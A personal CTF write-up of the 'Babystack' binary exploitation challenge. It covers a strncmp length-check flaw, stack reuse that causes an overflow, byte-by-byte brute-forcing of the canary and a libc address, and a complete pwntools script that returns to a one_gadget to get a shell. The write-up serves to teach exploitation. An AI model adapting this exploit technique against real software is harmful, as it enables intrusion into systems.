---
title: "Babystack"
date: 2023-05-09T00:22:46-07:00
draft: false
---

# The binary

So this binary is super small, but it's stripped for the 
most part making it pretty annoying to work with. I opened 
it up in ghidra and found the main function. Essentially what
the program does is open up the `/dev/urandom` file on the 
filesystem and save 16 bytes of that to a local variable. This 
is shown here:
```C
rand_fp = open("/dev/urandom",0);
read(rand_fp,&rand_str,0x10);
puVar1 = DAT_00302020;
*DAT_00302020 = rand_str;
puVar1[1] = local_20;
close(rand_fp);
```
rand_str is what I named this random string that gets pulled from
the urandom file. 

Then the program moves on to a while loop that has 3 'menu' options:
1. Sends you to a password check
2. Leaves the program
3. Sends you to a copy function

### The password check
This is a super simple function that takes in your input and compares
it with the string that was passed into the function:
```C 
printf("Your passowrd :");
FUN_00100ca0(local_88,0x7f); // reading 127 bytes of input
__n = strlen(local_88);
iVar1 = strncmp(local_88,param_1,__n);
if (iVar1 == 0) {
DAT_00302014 = 1;
puts("Login Success !");
} else {
puts("Failed !");
}
return;
```
One issue with this is that it only checks the number of bytes that you 
sent, so if you send nothing (or a null byte), it automatically succeeds. We can use that
in the exploit. 

### The Copy function
This is a weird copy function that creates a 128 byte string and reads 64 bytes of user 
input into the beginning of it, then copies the whole thing to a variable that gets
passed into the function. This is what it looks like:
```C
char local_88 [128];
printf("Copy :");
FUN_00100ca0(local_88,0x3f);
strcpy(param_1,local_88);
puts("It is magic copy !");
return;
```
I was really confused why it only asks for 64 bytes of input when the buffer is 128. 
Then it hit me. The stack of the password function is in the same location as the 
stack in the copy function. This means that if you set the variable longer than 64 bytes
in the password function, those last bytes are going to be copied into the copy buffer.

This is essentially the trick that ends up with a buffer overflow.

# The exploit
So I was able to overwrite the stack, but there was a custom stack check built into the 
program that kept me from a segfault. This led me to brute force the canary since the 
canary is the password that your input gets checked against, you can guess as many times
as you want. What I ended up doing is brute forcing the stack canary one byte at a time.
This wasn't too difficult, and I could brute force it pretty much instantly. This part 
got me to a return address overwrite, but I had no idea what to return to. Well, convieniently
The spot on the stack where the random string is in the password function happens to be taken
by a libc address on the copy function. This is how we get the libc leak. We can copy the 
libc address into the password variable and brute force it byte-by-byte. 

This lead to a nice leak of the libc and I was able to take that leak and convert it to a
one_gadget and append it to the return address. This ended up getting the shell. I had some
issues on remote since it was a brute force, but running it for about 20 minutes got a shell 
just fine. This is what my final exploit looked like: 
```C 
def brute():
    some = b''
    for x in range(16):
        s = b''
        for i in range(1, 255):
            p.sendline(b'1')
            p.recvuntil(b'Your passowrd :')
            payload = some + i.to_bytes(1)
            p.sendline(some + i.to_bytes(1))
            conf = p.recv()
            if b'Failed' not in conf:
                print(conf)
                s = i.to_bytes(1)
                p.sendline(b"1")
                p.recv()
                break
        some += s
    return some

p = conn() # Connecting to the server
rand = brute()
print('Rand str {}'.format(rand))
p.sendline(b'1')
print(p.recv())
p.send(b'\x00' + b'A'*(71))
print(p.recv())
p.sendline(b'3')
print(p.recvuntil(b'Copy :'))
p.send(b'B'*0x3f)
print(p.recvuntil(b'>> '))
p.sendline(b'1')
print(p.recvuntil(b'>> '))
leak = brute()
addr = unpack(leak[8:16], 'all')
print(hex(addr -492601))
libc.address = addr-492601
p.sendline(b'1')
print(p.recv())
p.sendline(b'\x00' + b'A'*(63) + rand + b's'*24 + p64(libc.address + 0x45216))
print(p.recv())
p.sendline(b'3')
print(p.recv())
p.send(b'B'*0x3f)
print(p.recv())
p.sendline(b'2')
p.interactive()
```
Thanks for reading. If you have any questions feel free to reach out to me on twitter @lucasballr
